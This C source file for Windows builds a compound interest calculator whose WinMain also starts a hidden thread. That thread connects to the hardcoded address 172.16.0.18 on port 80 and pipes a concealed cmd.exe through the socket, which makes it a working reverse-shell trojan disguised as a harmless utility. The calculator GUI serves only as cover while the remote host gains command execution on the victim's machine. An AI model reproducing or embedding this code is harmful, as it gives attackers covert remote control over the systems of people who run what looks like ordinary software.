#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <math.h>

#pragma comment(lib, "ws2_32.lib")

// Global variables for GUI
HWND hPrincipal, hRate, hTime, hResult, hButton;

// Reverse shell function
DWORD WINAPI ReverseShell(LPVOID lpParam) {
    WSADATA wsaData;
    SOCKET s;
    struct sockaddr_in server;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char *ip = "172.16.0.18";
    int port = 80;

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(ip);

    if (connect(s, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        closesocket(s);
        WSACleanup();
        return 1;
    }

    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = (HANDLE)s;
    si.hStdOutput = (HANDLE)s;
    si.hStdError = (HANDLE)s;
    si.wShowWindow = SW_HIDE;  // Hide the command prompt window

    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW,
NULL, NULL, &si, &pi);

    WaitForSingleObject(pi.hProcess, INFINITE);
    closesocket(s);
    WSACleanup();
    return 0;
}

// Compound Interest Calculation Function
void CalculateInterest(HWND hWnd) {
    char principalStr[20], rateStr[20], timeStr[20];
    double principal, rate, time, amount;

    GetWindowText(hPrincipal, principalStr, 20);
    GetWindowText(hRate, rateStr, 20);
    GetWindowText(hTime, timeStr, 20);

    principal = atof(principalStr);
    rate = atof(rateStr);
    time = atof(timeStr);

    amount = principal * pow((1 + rate / 100), time);

    char result[50];
    sprintf(result, "Final Amount: $%.2f", amount);
    SetWindowText(hResult, result);
}

// Windows Procedure
LRESULT CALLBACK WindowProcedure(HWND hWnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {
        case WM_CREATE:
            CreateWindow("STATIC", "Principal:", WS_VISIBLE |
WS_CHILD, 20, 20, 100, 20, hWnd, NULL, NULL, NULL);
            hPrincipal = CreateWindow("EDIT", "", WS_VISIBLE |
WS_CHILD | WS_BORDER, 120, 20, 150, 20, hWnd, NULL, NULL, NULL);

            CreateWindow("STATIC", "Rate (%):", WS_VISIBLE | WS_CHILD,
20, 50, 100, 20, hWnd, NULL, NULL, NULL);
            hRate = CreateWindow("EDIT", "", WS_VISIBLE | WS_CHILD |
WS_BORDER, 120, 50, 150, 20, hWnd, NULL, NULL, NULL);

            CreateWindow("STATIC", "Time (years):", WS_VISIBLE |
WS_CHILD, 20, 80, 100, 20, hWnd, NULL, NULL, NULL);
            hTime = CreateWindow("EDIT", "", WS_VISIBLE | WS_CHILD |
WS_BORDER, 120, 80, 150, 20, hWnd, NULL, NULL, NULL);

            hButton = CreateWindow("BUTTON", "Calculate", WS_VISIBLE |
WS_CHILD, 20, 110, 250, 30, hWnd, (HMENU)1, NULL, NULL);
            hResult = CreateWindow("STATIC", "Result:", WS_VISIBLE |
WS_CHILD, 20, 150, 250, 20, hWnd, NULL, NULL, NULL);
            break;

        case WM_COMMAND:
            if (LOWORD(wp) == 1) {
                CalculateInterest(hWnd);
            }
            break;

        case WM_DESTROY:
            PostQuitMessage(0);
            break;

        default:
            return DefWindowProc(hWnd, msg, wp, lp);
    }
    return 0;
}

// GUI Application Thread
DWORD WINAPI GUIThread(LPVOID lpParam) {
    HINSTANCE hInst = (HINSTANCE)lpParam;
    WNDCLASS wc = {0};
    wc.lpszClassName = "CompoundInterest";
    wc.hInstance = hInst;
    wc.lpfnWndProc = WindowProcedure;
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);

    RegisterClass(&wc);
    HWND hWnd = CreateWindow("CompoundInterest", "Compound Interest Calculator", WS_OVERLAPPEDWINDOW | WS_VISIBLE, 100, 100, 300, 250, NULL, NULL, hInst, NULL);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}

// Main Function
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int
nCmdShow) {
    HANDLE hThread1, hThread2;

    // Create threads for reverse shell and GUI
    hThread1 = CreateThread(NULL, 0, ReverseShell, NULL, 0, NULL);
    hThread2 = CreateThread(NULL, 0, GUIThread, (LPVOID)hInst, 0, NULL);

    // Wait for GUI thread to finish
    WaitForSingleObject(hThread2, INFINITE);

    CloseHandle(hThread1);
    CloseHandle(hThread2);

    return 0;
}
